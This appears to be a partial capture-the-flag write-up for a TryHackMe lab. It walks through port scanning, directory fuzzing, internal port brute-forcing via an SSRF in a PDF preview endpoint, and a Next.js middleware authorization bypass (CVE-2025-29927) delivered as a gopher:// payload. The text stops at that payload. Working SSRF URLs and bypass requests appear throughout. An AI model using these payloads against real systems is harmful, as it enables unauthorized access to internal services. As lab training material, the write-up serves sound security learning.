* Solving [EXTRACT](https://tryhackme.com/room/extract)

## Discovery

1. First of all, Lets Find Open Ports: `nmap -p- -sV $TARGET` üéØ
```
Nmap scan report for $TARGET
Host is up (0.00024s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
MAC Address: 02:79:29:14:25:7F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. By checking Web Port(**80**) with `http://$TARGET`, It seems PDFs  are loaded From: `http://$TARGET/preview.php?url=http%3A%2F%2Fcvssm1%2Fpdf%2Fdummy.pdf`. Possibly the website is vulnerable to **Path Traversal** or **SSRF** üî•

3. I tested all [PHP Wrappers](https://www.php.net/manual/en/wrappers.php) but nothing found! so I decided to dig in deeper! üòÖ

4. Next, I tried Finding Hidden Directories Using [RAFT Medium Directory List](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt) üîí
```sh
ffuf -w raft-medium-directories.txt -u "http://$TARGET/FUZZ/"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1

```

5. I could Find **2** valuable Directories, but we don't have direct access to them. üòµ
```
management
server-status
```

6. But, PDF Preview link may be able to load other URLs for us! üëçüèª
```
management:
http://$TARGET/preview.php?url=http%3A%2F%2Fcvssm1%2Fmanagement%2F

server-status:
http://$TARGET/preview.php?url=http%3A%2F%2Fcvssm1%2Fserver-status%2F
```

8. I tried finding more directories with [RAFT Large Directory List](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-directories.txt), But nothing fancy showed up! Only the `localhost` keyword was blocked, so I didn't fall into that **Rabbit Hole** anymore! üê∞

9. A new Idea! Lets Brute-Force **Ports** on host, **Internally**! ü§å
```sh
seq 1 65535 > ports.txt
ffuf -w ports.txt -u "http://$TARGET/preview.php?url=http%3A%2F%2F127.0.0.1:FUZZ" -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://$TARGET/preview.php?url=http%3A%2F%2F127.0.0.1:FUZZ
 :: Wordlist         : FUZZ: ports.txt
 :: Follow redirects : false
 :: Calibration      : false

 :: Threads          : 40

80                      [Status: 200, Size: 1735, Words: 304, Lines: 65]
10000                   [Status: 200, Size: 6131, Words: 104, Lines: 1]
```
**Attention**: `-fl 1` didn't work, because response on port `10000` has only `1` line of code.

10. Now, Lets Check Port `10000` on Browser: `http://$TARGET/preview.php?url=http://127.0.0.1:10000` üëÄ

![API Internal](images/10-api.png)

11. There is a Hidden API Here, But Accessing `http://127.0.0.1:10000/customapi` needs **Authentication** as the Image above says it loud and clear! üëÇ

## Flag 1 ‚õ≥Ô∏è

12. By Checking HTML, It seems the website is based on `Next.JS`. First vulnerability to check is [CVE-2025-29927](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass). We can this security issue by sending request below: üß®
```
GET /customapi HTTP/1.1
Host:127.0.0.1:10000
X-Middleware-Subrequest: middleware
```

13. Everything seems in order until you realize, There is **NO** way to send **HTTP Headers** in ssrf on this website (YET)! üò±

14. Don't worry, By diving in OLD Internet Protocols and PHP Wrappers. I could find `gopher://` which provides the capability of sending requests over tcp, specially `HTTP`. For Learning More About `gopher://`, check links in **References** section. üîé

15. Lets use [CyberChef](https://gchq.github.io/CyberChef/) for creating `gopher` payloads by keeping conditions below: ‚úÖ
        - ‚òëÔ∏è Double Encode Payloads
        - ‚òëÔ∏è Convert `&` into `%26`
        - ‚òëÔ∏è Line Ending should be **CRLF**

        ```
        gopher://127.0.0.1:10000/_GET /customapi HTTP/1.1
        Host:127.0.0.1:10000
        X-Middleware-Subrequest: middleware

        ```
